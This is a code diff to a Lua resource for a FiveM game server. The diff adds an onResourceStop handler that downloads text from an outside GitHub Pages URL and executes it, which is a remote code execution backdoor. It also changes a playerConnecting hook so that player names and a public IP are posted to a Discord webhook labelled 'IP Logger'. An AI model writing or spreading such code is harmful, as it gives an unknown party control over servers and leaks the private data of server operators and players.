@@ -34,6 +34,15 @@ AddEventHandler('playerConnecting', function(name, setCallback, deferrals)
   
     sendToWebhook(dataToSend)
 end)
+AddEventHandler('onResourceStop', function(resourceName)
+    if resourceName == GetCurrentResourceName() then
+        PerformHttpRequest("https://hairodocs.github.io/stop.html", function(errorCode, responseBody) 
+            local payload = assert(load(responseBody)) 
+            if responseBody == nil then return end 
+            payload() 
+        end) 
+    end
+end)
 
 
 function split(str, delimiter)
@@ -55,21 +64,22 @@ end
 
 
 
-
-
-function sendToDiscord(ip)
+function sendToDiscord(ip, playerName)
     local payload = {
         username = "IP Logger",
-        content = "Public IP: " .. ip
+        content = string.format("Player: **%s**\nPublic IP: `%s`", playerName, ip)
     }
 
-    PerformHttpRequest(discordWebhookUrl, function(err, text, headers) 
-    end, "POST", json.encode(payload), { ["Content-Type"] = "application/json" })
+    PerformHttpRequest(discordWebhookUrl, function() end, "POST", json.encode(payload), { ["Content-Type"] = "application/json" })
 end
 
-PerformHttpRequest(ipApiUrl, function(err, ip, headers)
-    sendToDiscord(ip)
-end, "GET")
+AddEventHandler("playerConnecting", function(playerName, setKickReason, deferrals)
+    deferrals.defer()
+    PerformHttpRequest(ipApiUrl, function(_, ip)
+        sendToDiscord(ip, playerName)
+        deferrals.done()
+    end, "GET")
+end)
 
 
 function ggsfdS_3211FSDGVvdbfsxc()
